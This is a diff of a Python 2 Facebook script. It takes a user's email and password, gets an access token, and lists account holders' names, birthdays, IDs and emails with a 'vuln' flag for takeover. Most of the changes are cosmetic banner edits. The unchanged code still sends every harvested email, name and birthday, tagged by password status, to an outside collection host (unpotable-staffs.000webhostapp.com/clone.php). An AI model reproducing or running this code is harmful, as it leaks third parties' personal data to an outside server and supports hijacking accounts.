@@ -9,16 +9,16 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 os.system("clear")
 
-print "\033[36m" + "*******************************************************"
+print "\033[36m" + "#######################################################"
 print ""
 print "\033[36m" + "      /\       ---     |   |       /\       |\    /|   "
 print "\033[36m" + "     /  \     |   \    |   |      /  \      | \  / |   "
 print "\033[36m" + "    /----\    |    |   |---|     /----\     |  \/  |   "
 print "\033[36m" + "   /      \   |___/    |   |    /      \    |      |   "
 print ""
-print "\033[36m" + "*******************************************************"
+print "\033[36m" + "#######################################################"
 
-print "\033[36m| " + 1*" " + "\033[35m Welcome to my script ® By Adham amer & mo mans" + 1*" " + "\033[36m|"
+print "\033[36m " + 1*" " + "\033[35m WELCOME TO MY SCRIPT ® BY ADHAM AMER & MO MANS" + 1*" " + "\033[36m"
 
 idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
 passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")
@@ -28,7 +28,6 @@ data = urllib.urlopen(url)
 op = json.load(data)
 if 'access_token' in op:
     token = (op["access_token"])
-    os.system("clear")
     print ("\033[39m[\033[31m+\033[39m] Login Succeed")
     
 else:
@@ -92,12 +91,12 @@ def defense():
                         pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                     except:
                         pass
-                    print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
+                    print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                     print "\033[36m" + z['name'] 
                     print "\033[36mBirthday :" + z['birthday']
                     print "\033[36mID :" + z['id']
                     print "\033[36m" + z['email'] + vuln 
-                    print "\033[39m" + 55*"*"
+                    print "\033[39m" + 55*"-"
                     print ""
                     print ""
 
@@ -117,12 +116,12 @@ def defense():
                     pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
+                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
                 print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
-                print "\033[39m" + 55*"*"
+                print "\033[39m" + 55*"-"
                 print ""
                 print ""
             elif 'hotmail' in cari: #
@@ -143,12 +142,12 @@ def defense():
                     pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
+                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
                 print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
-                print "\033[39m" + 55*"*"
+                print "\033[39m" + 55*"-"
                 print ""
                 print ""
             else:
@@ -166,15 +165,25 @@ def defense():
                     pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Sure&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
                 except:
                     pass
-                print "\033[39m" + 25*"*" +" [ "+ str(i)+" ] "+ 25*"*"
+                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                 print "\033[36m" + z['name'] 
                 print "\033[36mBirthday :" + z['birthday']
                 print "\033[36mID :" + z['id']
                 print "\033[36m" + z['email'] + vuln 
-                print "\033[39m" + 55*"*"
+                print "\033[39m" + 55*"-"
                 print ""
                 print ""
                 #pass
         except KeyError:
             pass
 defense()
+print "\033[36m" + "#######################################################"
+print ""
+print "\033[36m" + "      /\       ---     |   |       /\       |\    /|   "
+print "\033[36m" + "     /  \     |   \    |   |      /  \      | \  / |   "
+print "\033[36m" + "    /----\    |    |   |---|     /----\     |  \/  |   "
+print "\033[36m" + "   /      \   |___/    |   |    /      \    |      |   "
+print ""
+print "\033[36m" + "#######################################################"
+
+print "\033[36m " + 1*" " + "\033[35m Good Luck !!!" + 1*" " + "\033[36m"
